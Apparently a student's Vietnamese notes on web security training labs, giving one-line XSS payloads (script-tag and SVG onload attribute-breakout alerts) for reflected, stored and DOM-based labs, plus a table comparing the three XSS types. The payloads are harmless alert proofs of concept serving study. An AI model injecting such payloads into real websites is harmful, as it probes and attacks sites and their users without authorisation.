# 1. LAB 

## 1. Lab: Reflected XSS into HTML context with nothing encoded ##

`<script>alert(0)</script>`

## 2. Lab: Stored XSS into HTML context with nothing encoded ##

Nhập script này vào phần comment, mỗi khi vào blog ( có cmt chứa script đó ) alert sẽ hiện lên
`<script>alert(0)</script>`

## 3. Lab: DOM XSS in document.write sink using source location.search ##

Input nằm trong thẻ `img src `
<img width="773" height="148" alt="image" src="https://github.com/user-attachments/assets/d6759e14-18cc-4ed9-8a59-c72d72c9bcca" />

Nhập `"><svg onload=alert(98898)>` để thoát attribute và nhập element mới

## 4. 


# 2. NOTE

## 1. Phân biệt các loại XSS


| Các loại  | Nơi lưu mã độc | Cách kích hoạt | Mức độ ảnh hưởng | Ví dụ thực tế
| :--- | :--- | :--- | :--- | :--- |
| **Stored XSS (Persistent)** | Lưu trực tiếp trên máy chủ (Cơ sở dữ liệu, file log, bình luận...) | Người dùng chỉ cần truy cập vào trang web chứa dữ liệu đó là mã tự chạy | Rất cao, ảnh hưởng đến mọi người dùng truy cập vào trang chứa payload | Bình luận chứa mã độc trong bài viết; bất kỳ ai đọc bài viết đều dính mã |
| **Reflected XSS (Non-persistent)** | Không lưu trên server; nằm sẵn trong URL hoặc tham số request | Nạn nhân phải bấm vào một liên kết (URL) độc hại đã được gửi sẵn | Trung bình/Cao, chỉ ảnh hưởng lên từng cá nhân bấm vào link | Link tìm kiếm hoặc link đăng nhập kèm mã độc: `://site.com<script>...</script>` |
| **DOM-based XSS** | Xử lý hoàn toàn ở phía client (trong DOM của trang web) | Mã JavaScript đọc dữ liệu từ nguồn bất cẩn (như location.search) và ghi vào DOM | Phụ thuộc vào cách client-side script xử lý dữ liệu | Trang web lấy thông số từ `location.hash` rồi hiển thị trực tiếp lên giao diện qua innerHTML |







